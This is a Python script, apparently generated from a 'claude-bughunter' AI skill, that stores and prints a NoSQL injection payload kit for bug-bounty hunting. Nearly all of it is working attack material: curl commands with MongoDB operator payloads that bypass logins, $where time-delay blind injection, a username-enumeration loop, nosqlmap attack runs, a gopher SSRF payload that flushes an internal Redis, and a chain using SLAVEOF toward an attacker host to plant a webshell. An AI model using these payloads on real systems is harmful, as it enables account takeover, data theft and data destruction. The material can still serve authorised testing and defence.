#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-nosqli

Skill: HUNT-NOSQLI — NoSQL Injection
Desc : Hunt NoSQL Injection — MongoDB operator injection ($where, $regex, $gt, $ne), CouchDB, Redis command injection, auth bypass via NoSQLi, data dump. Use when target uses MongoDB/Mongoose, CouchDB, Redis, or shows NoSQL error messages.

Run:  python claude-bughunter-hunt-nosqli.py --help
      python claude-bughunter-hunt-nosqli.py --list
      python claude-bughunter-hunt-nosqli.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-nosqli'
TITLE = 'HUNT-NOSQLI — NoSQL Injection'
DESCRIPTION = 'Hunt NoSQL Injection — MongoDB operator injection ($where, $regex, $gt, $ne), CouchDB, Redis command injection, auth bypass via NoSQLi, data dump. Use when target uses MongoDB/Mongoose, CouchDB, Redis, or shows NoSQL error messages.'

PAYLOADS = {
    'main': ["name: hunt-nosqli", "description: Hunt NoSQL Injection \u2014 MongoDB operator injection ($where, $regex, $gt, $ne), CouchDB, Redis command injection, auth bypass via NoSQLi, data dump. Use when target uses MongoDB/Mongoose, CouchDB, Redis, or shows NoSQL error messages.", "sources: hackerone_public", "report_count: 14"],
    'hunt-nosqli-nosql-injection': [],
    'crown-jewel-targets': ["NoSQL injection is most valuable when it bypasses authentication (Critical) or leaks the entire user collection (High).", "**Highest-value chains:**", "- **MongoDB auth bypass** \u2014 `{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}` logs in as first user in collection (usually admin)", "- **$where JS injection** \u2014 if $where is enabled: blind injection \u2192 data exfil", "- **Redis command injection** \u2014 via SSRF or direct TCP, SLAVEOF attacker-ip \u2192 config write \u2192 webshell", "- **Elasticsearch injection** \u2014 _search endpoint with Groovy script injection (pre-5.0) \u2192 RCE"],
    'attack-surface-signals': [],
    'url-param-patterns': ["/api/users/login         POST with JSON body", "/api/search?q=", "/api/find?filter=", "/api/query?where=", "Any endpoint accepting JSON body with username/password"],
    'stack-signals': [],
    'step-by-step-hunting-methodology': [],
    'phase-1-auth-bypass-mongodb': ["```bash"],
    'operator-injection-in-json-body': ["curl -s -X POST https://$TARGET/api/login \\", "-H \"Content-Type: application/json\" \\", "-d '{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}'"],
    'regex-wildcard-match-any-username': ["curl -s -X POST https://$TARGET/api/login \\", "-H \"Content-Type: application/json\" \\", "-d '{\"username\": {\"$regex\": \".*\"}, \"password\": {\"$regex\": \".*\"}}'"],
    'ne-not-equal-bypass': ["curl -s -X POST https://$TARGET/api/login \\", "-H \"Content-Type: application/json\" \\", "-d '{\"username\": \"admin\", \"password\": {\"$ne\": \"wrong\"}}'"],
    'in-array-bypass': ["curl -s -X POST https://$TARGET/api/login \\", "-H \"Content-Type: application/json\" \\", "-d '{\"username\": {\"$in\": [\"admin\",\"administrator\",\"root\"]}, \"password\": {\"$ne\": \"x\"}}'"],
    'phase-2-url-parameter-injection': ["```bash"],
    'array-notation-express-php-style': ["curl \"https://$TARGET/api/users?username[$gt]=&password[$gt]=\"", "curl \"https://$TARGET/api/search?q[$regex]=.*&q[$options]=i\""],
    'post-form-data': ["curl \"https://$TARGET/api/login\" \\", "--data \"username[$gt]=&password[$gt]=\""],
    'phase-3-where-blind-injection-time-based': ["```bash"],
    'test-if-where-is-enabled-time-based-detection-5s-delay': ["curl -s -X POST https://$TARGET/api/search \\", "-H \"Content-Type: application/json\" \\", "-d '{\"q\": {\"$where\": \"function(){var d=new Date();while(new Date()-d<5000){}; return true;}\"}}'"],
    'if-response-takes-5-seconds-where-injection-confirmed': [],
    'blind-data-exfil-username-starts-with-a': ["curl -s -X POST https://$TARGET/api/search \\", "-H \"Content-Type: application/json\" \\", "-d '{\"q\": {\"$where\": \"function(){if(this.username.match(/^a/)){sleep(3000);} return true;}\"}}'"],
    'phase-4-data-dump-via-regex': ["```bash"],
    'enumerate-usernames-character-by-character': ["for c in a b c d e f g h i j k l m n o p q r s t u v w x y z; do", "RESP=$(curl -s -X POST https://$TARGET/api/users \\", "-H \"Content-Type: application/json\" \\", "-d \"{\\\"username\\\": {\\\"\\$regex\\\": \\\"^$c\\\"}}\")", "echo \"$c: $(echo $RESP | wc -c)\""],
    'phase-5-automation': ["```bash"],
    'nosqlmap': ["pip3 install nosqlmap", "nosqlmap -u \"https://$TARGET/api/login\" --attack 1"],
    'nosqlmap-data-extraction': ["nosqlmap -u \"https://$TARGET/api/login\" --attack 2"],
    'phase-6-redis-via-ssrf': ["```bash"],
    'if-ssrf-found-probe-internal-redis-via-gopher': ["curl \"https://$TARGET/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a\""],
    'config-set-webshell-if-redis-has-write-access-to-web-root': [],
    'use-slaveof-for-oob-data-exfil': [],
    'bypass-table': [],
    'chain-table': [],
    'validation': ["\u2705 Auth bypass: logged in without valid credentials, received valid session token", "\u2705 Data dump: returned users/documents you shouldn't have access to", "\u2705 Blind injection: confirmed via time-delay (>4 seconds consistent)", "**Severity:**", "- Auth bypass as admin: Critical", "- User collection dump: High", "- Blind injection (no useful exfil): Medium"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()